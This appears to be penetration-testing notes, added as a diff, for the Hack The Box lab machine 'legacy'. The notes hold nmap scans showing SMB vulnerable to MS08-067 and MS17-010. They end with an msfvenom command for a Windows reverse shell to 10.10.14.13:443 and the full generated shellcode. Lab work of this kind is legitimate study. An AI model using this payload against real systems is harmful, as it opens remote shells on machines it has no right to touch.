@@ -1,0 +1,151 @@
+#####Port Ennummeration######
+#############################
+nmap -sS -sV -T4 10.10.10.4 -vv
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-18 08:48 EDT
+NSE: Loaded 45 scripts for scanning.
+Initiating Ping Scan at 08:48
+Scanning 10.10.10.4 [4 ports]
+Completed Ping Scan at 08:48, 0.25s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 08:48
+Completed Parallel DNS resolution of 1 host. at 08:48, 0.00s elapsed
+Initiating SYN Stealth Scan at 08:48
+Scanning 10.10.10.4 [1000 ports]
+Discovered open port 445/tcp on 10.10.10.4
+Discovered open port 139/tcp on 10.10.10.4
+Completed SYN Stealth Scan at 08:48, 12.46s elapsed (1000 total ports)
+Initiating Service scan at 08:48
+Scanning 2 services on 10.10.10.4
+Completed Service scan at 08:48, 6.88s elapsed (2 services on 1 host)
+NSE: Script scanning 10.10.10.4.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 08:48
+Completed NSE at 08:48, 0.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 08:48
+Completed NSE at 08:48, 0.00s elapsed
+Nmap scan report for 10.10.10.4
+Host is up, received echo-reply ttl 127 (0.22s latency).
+Scanned at 2020-04-18 08:48:23 EDT for 20s
+Not shown: 997 filtered ports
+Reason: 997 no-responses
+PORT     STATE  SERVICE       REASON          VERSION
+139/tcp  open   netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+445/tcp  open   microsoft-ds  syn-ack ttl 127 Microsoft Windows XP microsoft-ds
+3389/tcp closed ms-wbt-server reset ttl 127
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+####OS discovery using nmap scan with smb-os-discovery####
+##########################################################
+nmap --script smb-os-discovery.nse -p445 10.10.10.4
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-18 08:54 EDT
+Nmap scan report for 10.10.10.4
+Host is up (0.22s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: legacy
+|   NetBIOS computer name: LEGACY\x00
+|   Workgroup: HTB\x00
+
+####Scanning for SMB vulnerabilties using cves####
+##################################################
+
+
+nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.4
+
+Host script results:
+| smb-vuln-ms08-067: 
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2008-4250
+|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
+|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
+|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+|           
+|     Disclosure date: 2008-10-23
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
+|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 1) scan.
+Initiating NSE at 08:58
+Completed NSE at 08:58, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 6.28 seconds
+           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)
+
+
+
+
+
+############################SHELLCODE######################################
+
+> msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.13 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
+Attempting to encode payload with 1 iterations of generic/none
+generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
+Attempting to encode payload with 1 iterations of x86/call4_dword_xor
+x86/call4_dword_xor succeeded with size 348 (iteration=0)
+x86/call4_dword_xor chosen with final size 348
+Payload size: 348 bytes
+Final size of py file: 1953 bytes
+shellcode =  b""
+shellcode += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
+shellcode += b"\x5e\x81\x76\x0e\xb1\xb2\xc7\xbd\x83\xee\xfc"
+shellcode += b"\xe2\xf4\x4d\x5a\x45\xbd\xb1\xb2\xa7\x34\x54"
+shellcode += b"\x83\x07\xd9\x3a\xe2\xf7\x36\xe3\xbe\x4c\xef"
+shellcode += b"\xa5\x39\xb5\x95\xbe\x05\x8d\x9b\x80\x4d\x6b"
+shellcode += b"\x81\xd0\xce\xc5\x91\x91\x73\x08\xb0\xb0\x75"
+shellcode += b"\x25\x4f\xe3\xe5\x4c\xef\xa1\x39\x8d\x81\x3a"
+shellcode += b"\xfe\xd6\xc5\x52\xfa\xc6\x6c\xe0\x39\x9e\x9d"
+shellcode += b"\xb0\x61\x4c\xf4\xa9\x51\xfd\xf4\x3a\x86\x4c"
+shellcode += b"\xbc\x67\x83\x38\x11\x70\x7d\xca\xbc\x76\x8a"
+shellcode += b"\x27\xc8\x47\xb1\xba\x45\x8a\xcf\xe3\xc8\x55"
+shellcode += b"\xea\x4c\xe5\x95\xb3\x14\xdb\x3a\xbe\x8c\x36"
+shellcode += b"\xe9\xae\xc6\x6e\x3a\xb6\x4c\xbc\x61\x3b\x83"
+shellcode += b"\x99\x95\xe9\x9c\xdc\xe8\xe8\x96\x42\x51\xed"
+shellcode += b"\x98\xe7\x3a\xa0\x2c\x30\xec\xda\xf4\x8f\xb1"
+shellcode += b"\xb2\xaf\xca\xc2\x80\x98\xe9\xd9\xfe\xb0\x9b"
+shellcode += b"\xb6\x4d\x12\x05\x21\xb3\xc7\xbd\x98\x76\x93"
+shellcode += b"\xed\xd9\x9b\x47\xd6\xb1\x4d\x12\xed\xe1\xe2"
+shellcode += b"\x97\xfd\xe1\xf2\x97\xd5\x5b\xbd\x18\x5d\x4e"
+shellcode += b"\x67\x50\xd7\xb4\xda\xcd\xb7\xbf\xbf\xaf\xbf"
+shellcode += b"\xb1\xb3\x7c\x34\x57\xd8\xd7\xeb\xe6\xda\x5e"
+shellcode += b"\x18\xc5\xd3\x38\x68\x34\x72\xb3\xb1\x4e\xfc"
+shellcode += b"\xcf\xc8\x5d\xda\x37\x08\x13\xe4\x38\x68\xd9"
+shellcode += b"\xd1\xaa\xd9\xb1\x3b\x24\xea\xe6\xe5\xf6\x4b"
+shellcode += b"\xdb\xa0\x9e\xeb\x53\x4f\xa1\x7a\xf5\x96\xfb"
+shellcode += b"\xbc\xb0\x3f\x83\x99\xa1\x74\xc7\xf9\xe5\xe2"
+shellcode += b"\x91\xeb\xe7\xf4\x91\xf3\xe7\xe4\x94\xeb\xd9"
+shellcode += b"\xcb\x0b\x82\x37\x4d\x12\x34\x51\xfc\x91\xfb"
+shellcode += b"\x4e\x82\xaf\xb5\x36\xaf\xa7\x42\x64\x09\x27"
+shellcode += b"\xa0\x9b\xb8\xaf\x1b\x24\x0f\x5a\x42\x64\x8e"
+shellcode += b"\xc1\xc1\xbb\x32\x3c\x5d\xc4\xb7\x7c\xfa\xa2"
+shellcode += b"\xc0\xa8\xd7\xb1\xe1\x38\x68"
+
